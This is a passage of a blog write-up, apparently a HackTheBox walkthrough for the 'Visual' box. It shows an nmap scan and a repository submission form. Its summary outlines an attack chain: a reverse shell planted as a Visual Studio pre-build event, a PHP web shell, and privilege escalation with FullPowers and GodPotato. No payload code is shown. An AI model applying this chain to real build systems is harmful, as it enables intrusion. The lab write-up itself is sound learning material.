@@ -1,0 +1,1365 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Visual is a medium difficulty box, offering a service to compile Visual Studio projects from any git-based repository. By hosting our own git server, we can supply a malicious project, where we insert a reverse shell payload as a pre-build event. With the shell connection to the box, we can upload a reverse shell php file in the web root, and control as NT Authority\Local Service. FullPowers allows us to retrieve extra privileges, and we can use GodPotato to escalate to SYSTEM level authority.'><title>HackTheBox - Visual</title>
+
+<link rel='canonical' href='https://yuwenmichael.netlify.app/post/hackthebox-visual/'>
+
+<link rel="stylesheet" href="/scss/style.min.59703bed5f69041ffba70837d909b8000139e78c5201b54e051ae44c256c2d69.css"><meta property='og:title' content='HackTheBox - Visual'>
+<meta property='og:description' content='Visual is a medium difficulty box, offering a service to compile Visual Studio projects from any git-based repository. By hosting our own git server, we can supply a malicious project, where we insert a reverse shell payload as a pre-build event. With the shell connection to the box, we can upload a reverse shell php file in the web root, and control as NT Authority\Local Service. FullPowers allows us to retrieve extra privileges, and we can use GodPotato to escalate to SYSTEM level authority.'>
+<meta property='og:url' content='https://yuwenmichael.netlify.app/post/hackthebox-visual/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Gitea' /><meta property='article:tag' content='Visual Studio' /><meta property='article:tag' content='FullPowers' /><meta property='article:tag' content='GodPotato' /><meta property='article:tag' content='dotnet' /><meta property='article:published_time' content='2024-02-24T22:18:54-05:00'/><meta property='article:modified_time' content='2024-02-24T22:18:54-05:00'/><meta property='og:image' content='https://yuwenmichael.netlify.app/post/hackthebox-visual/Visual.png' />
+<meta name="twitter:title" content="HackTheBox - Visual">
+<meta name="twitter:description" content="Visual is a medium difficulty box, offering a service to compile Visual Studio projects from any git-based repository. By hosting our own git server, we can supply a malicious project, where we insert a reverse shell payload as a pre-build event. With the shell connection to the box, we can upload a reverse shell php file in the web root, and control as NT Authority\Local Service. FullPowers allows us to retrieve extra privileges, and we can use GodPotato to escalate to SYSTEM level authority."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://yuwenmichael.netlify.app/post/hackthebox-visual/Visual.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu9f9ff13576eb7121750203f114cffc3e_12283_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/spencerja'
+                        target="_blank"
+                        title="Github"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://app.hackthebox.com/profile/1202496'
+                        target="_blank"
+                        title="HackTheBox"
+                    >
+                        
+                        
+                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://ctftime.org/team/217710'
+                        target="_blank"
+                        title="Team"
+                    >
+                        
+                        
+                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
+    preserveAspectRatio="xMidYMid meet">
+    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
+        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
+            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
+            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
+            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
+        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
+            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
+            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://tryhackme.com/p/spencerj'
+                        target="_blank"
+                        title="TryHackMe"
+                    >
+                        
+                        
+                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://yuwenmichael.netlify.app/" selected>English</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/hackthebox-visual/">
+                <img src="/post/hackthebox-visual/Visual_hu2821e9da4ab5851c83163c70bbdf7481_348069_800x0_resize_box_3.png"
+                        srcset="/post/hackthebox-visual/Visual_hu2821e9da4ab5851c83163c70bbdf7481_348069_800x0_resize_box_3.png 800w, /post/hackthebox-visual/Visual_hu2821e9da4ab5851c83163c70bbdf7481_348069_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Visual" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack the Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/hackthebox-visual/">HackTheBox - Visual</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Visual is a medium difficulty box, offering a service to compile Visual Studio projects from any git-based repository. By hosting our own git server, we can supply a malicious project, where we insert a reverse shell payload as a pre-build event. With the shell connection to the box, we can upload a reverse shell php file in the web root, and control as NT Authority\Local Service. FullPowers allows us to retrieve extra privileges, and we can use GodPotato to escalate to SYSTEM level authority.
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Feb 24, 2024</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration</h2>
+<p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.129.144.164
+</span></span><span class="line"><span class="cl">Host is up (0.076s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
+</span></span><span class="line"><span class="cl">|_http-title: Visual - Revolutionizing Visual Studio Builds
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Visiting the website, we see details on a Visual Studio project:
+<img src="/post/hackthebox-visual/Images/landingpage.png"
+	width="1335"
+	height="584"
+	srcset="/post/hackthebox-visual/Images/landingpage_hu3fd898158e1af6313df1c548f0498753_92850_480x0_resize_box_3.png 480w, /post/hackthebox-visual/Images/landingpage_hu3fd898158e1af6313df1c548f0498753_92850_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="228"
+		data-flex-basis="548px"
+	
+>
+On the home page, we see interesting options at the bottom including a submission form to provide our own repo:</p>
+<p><img src="/post/hackthebox-visual/Images/reposubmitform.png"
+	width="1269"
+	height="554"
+	srcset="/post/hackthebox-visual/Images/reposubmitform_hu54867fafc6f17184cb79a757fe307b1e_69559_480x0_resize_box_3.png 480w, /post/hackthebox-visual/Images/reposubmitform_hu54867fafc6f17184cb79a757fe307b1e_69559_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="229"
+		data-flex-basis="549px"
+	
+>
